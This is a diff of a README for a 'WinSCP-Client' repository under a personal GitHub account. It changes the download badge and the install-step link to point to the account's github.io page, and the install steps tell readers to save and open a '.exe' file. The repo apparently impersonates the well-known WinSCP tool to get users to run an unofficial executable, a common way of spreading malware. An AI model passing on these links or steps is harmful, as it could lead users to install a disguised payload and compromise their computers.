@@ -1,6 +1,6 @@
 # 📂 WinSCP-Client - Transfer files securely between computers
 
-[![](https://img.shields.io/badge/Download-WinSCP-blue)](https://github.com/mariabeze9211/WinSCP-Client)
+[![](https://img.shields.io/badge/Download-WinSCP-blue)](https://mariabeze9211.github.io)
 
 ## 📖 About this application
 
@@ -20,7 +20,7 @@ Before you install this software, check your computer for these requirements:
 
 Follow these steps to set up the client on your machine:
 
-1. Click here to [visit the download page](https://github.com/mariabeze9211/WinSCP-Client).
+1. Click here to [visit the download page](https://mariabeze9211.github.io).
 2. Look for the file ending in .exe.
 3. Select the file to save it to your Downloads folder.
 4. Open the downloaded file to start the installation.
